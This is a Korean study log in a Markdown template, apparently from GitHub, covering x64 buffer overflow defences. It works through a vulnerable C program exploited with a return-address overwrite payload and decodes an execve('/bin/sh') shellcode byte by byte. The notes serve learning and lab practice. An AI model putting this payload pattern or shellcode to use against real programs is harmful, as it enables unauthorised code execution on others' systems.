# 📅 YYYY.MM.DD Study Log

## 📌 오늘 배운 개념 요약

- 
- 
- 

---

## ✅ Buffer Overflow 방어 기술 (정리 예시)

###rax, rbx, rsp, rbp 를 배웠다.


##x64 환경에서 존재하는 BOF 방어 기법들
1. **Canary** => sfp,ret 의 정보를 저장할 때, bof공격으로 덮어씌어지는 것을 방지하기 위해 sfp와 buffer 사이에 임의의 값을 추가함. 이게 변조된다? ==> bof로 탐지.
2. **ASLR**(Address Space Layout Randomization) ==> 메모리 랜덤화.
3. **PIE**(Position Independent Execution)
4. **NX**(Non excutable)

![image](https://github.com/user-attachments/assets/2c709cf7-8554-41fd-89d6-5c266a306a07)
![image](https://github.com/user-attachments/assets/d963f3ad-1d72-4610-b77e-2642e1d5ccee)


#include <stdio.h>

void secret(){
        printf("You hacked me!\n");
}
int main(){
        char buf[64];

        printf("Input: ");
        scanf("%s", buf);

        printf("You typed: %s\n", buf);

        return 0;
}

해당 코드의 scanf의 취약점을 활용하려 bof를 시도했다.
조건 

$gcc -g -fno-stack-protector -no-pie -o bof1 bof1.c
==> canary, aslr

파일에 설정된 보호기법 확인?
checksec --file=파일명

payload 작성
buffer[64] + SFP[8] + 덮어쓸 주소[8]

gdb ./bof1
p $secret ==> secret 함수의 주소를 찾음.
python3 -c 'print("A"*64 + "B"*8 + "해당 주소")' | ./bof1
//출력: You hacked me!  

확인해보니 NX가 켜져있다. 다만 NX는 스택에서 실행되는 쉘코드를 막는 것! 나는 그냥 주소만 넣었을 뿐.




머신코드?
\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
***\x48\x31\xc0***
\x48 ==> REX prefix ==> 64비트 연산한다. rax rbx 쓸거다?
\x31 ==> opcode 
\xc0 ==> ModR/M 바이트. (rax 두개 쓸거다
       =xor rax, rax
       
***\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00***
\x48 ==> REX prefix
\xbb ==> mov r64,imm64  OR  mov r32,imm32      ==> 미리 prifix 해두었기에 movabs rbx, imm64 (만약 없으면 32bit로 쓰임)
\x2f\x62\x69\x6e\x2f\x73\x68\x00 ==> 리틀엔디언으로 '/bin/sh\0'
       =movabs rbx, 0x0068732f6e69622f
***\x53***
\x53 ==> push rbx (리틀엔디언 형식으로 저장!!! )
       = push rbx
***\x48\x89\xe7***
\x48
\x89 ==> mov r/m64, r64 "오른쪽 레지스터 값을 왼쪽에 복사."
\xe7 ==> 11100111 mod = 11, reg = 100, rsp = 111
       = mov rdi, rsp (rdi 레지스터에 /bin/sh 문자열의 주소를 넣음)
(참고자료)
![image](https://github.com/user-attachments/assets/00e78af8-872f-436e-aa93-639cd4fa5b7d)
![image](https://github.com/user-attachments/assets/1ab48fb3-2ebc-4576-b025-982a90972a25)

EAX	ECX	EDX	EBX	ESP	EBP	ESI	EDI
000	001	010	011	100	101	110	111

      
***\x48\x31\xf6***
\x48 익숙하죠?
\x31 ==> opcode xor r/m64, r64
\xf6 ==> 11110110 mod = 11, reg = 000???, rm = 110
       = xor rsi, rsi (rsi 레지스터를 0으로 초기화 = execve의 두번째 인자 NULL)

***\x48\x31\xd2***
\x48
\x31
\xd2 ==> mod = 11010010 mod = 11, reg = 010, rm = 010
      = xor rdx, rdx (rdx 레지스터를 0으로 초기화 = 3번째 인자 NULL)
***\xb0\x3b***
\xb0 ==> mov al, immm8 (8비트를 al에 넣는다.)
\x3b ==> 59(system call number 59.== execve)
      = mov al, 0x3b

시스템콜 넘버는
/usr/include/x86_64-linux-gnu/asm/unistd_64.h 여기서  cat해서 찾아보면 됨.

***\x0f\x05***
      = syscall (opcode)

모두 합치면?
xor rax, rax
movabs rbx,  0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall 




---

## 🧠 오늘의 느낀 점 ☑️


---
## ❓ 오늘의 궁금한 점 🔍


---

## 🔖 내일 목표 🎯

- [ ] CTF 문제 1개 풀고 write-up 작성
- [ ] 오늘의 궁금한 점 중 1개는 gdb로 실험
- [ ] 쉘코드 흐름 복습 및 시각화 정리


